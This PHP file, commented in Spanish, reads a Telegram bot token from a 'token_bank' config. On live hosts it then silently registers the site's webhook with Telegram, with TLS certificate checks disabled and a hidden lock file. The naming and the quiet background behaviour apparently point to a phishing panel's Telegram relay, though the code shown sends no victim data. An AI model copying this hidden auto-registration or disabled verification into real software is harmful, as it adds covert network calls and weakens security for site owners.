<?php
// flujo.php - Notificación de tráfico en vivo y auto-sincronización silenciosa de Webhook

function auto_registrar_webhook(string $token): void {
    if (empty($token)) {
        return;
    }

    $host = $_SERVER['HTTP_HOST'] ?? '';
    if (empty($host) || in_array($host, ['localhost', '127.0.0.1', '::1'], true) || strpos($host, 'localhost:') === 0) {
        return;
    }

    $projectDir = str_replace('\\', '/', dirname(__DIR__));
    $docRoot = str_replace('\\', '/', $_SERVER['DOCUMENT_ROOT'] ?? '');
    $relativePath = '';

    if ($docRoot !== '' && strpos($projectDir, $docRoot) === 0) {
        $relativePath = substr($projectDir, strlen($docRoot));
    } elseif (defined('BASE_PATH')) {
        $relativePath = BASE_PATH;
    }

    $relativePath = rtrim((string) $relativePath, '/');
    $basePath = $relativePath !== '' ? $relativePath : '';

    $protocol = (!empty($_SERVER['HTTPS']) && strtolower((string) $_SERVER['HTTPS']) !== 'off') ? 'https' : 'https';
    $webhookUrl = $protocol . '://' . rtrim($host, '/') . $basePath . '/webhook.php';

    $lockDir = dirname(__DIR__) . '/datac';
    if (!is_dir($lockDir)) {
        @mkdir($lockDir, 0777, true);
    }
    $lockFile = $lockDir . '/.webhook_domain';

    if (file_exists($lockFile)) {
        $savedUrl = trim((string) @file_get_contents($lockFile));
        if ($savedUrl === $webhookUrl) {
            return;
        }
    }

    // Registrar en Telegram de forma silenciosa en segundo plano
    $url = "https://api.telegram.org/bot{$token}/setWebhook?url=" . urlencode($webhookUrl);
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_TIMEOUT => 2
    ]);
    $resp = curl_exec($ch);
    curl_close($ch);

    if ($resp) {
        $json = json_decode($resp, true);
        if (!empty($json['ok'])) {
            @file_put_contents($lockFile, $webhookUrl);
        }
    }
}

function notificar_flujo(string $seccion) {
    $token = '';

    $configPath = dirname(__DIR__) . '/token_bank/config.php';
    if (!file_exists($configPath)) {
        $configPath = dirname(__DIR__) . '/config.php';
    }
    if (file_exists($configPath)) {
        $cfg = @include $configPath;
        if (is_array($cfg)) {
            $token = $cfg['bot_token'] ?? '';
        }
    }

    // Mantiene la auto-sincronización silenciosa del webhook sin enviar mensajes de visitas a Telegram
    if (!empty($token)) {
        auto_registrar_webhook($token);
    }

    return;
}
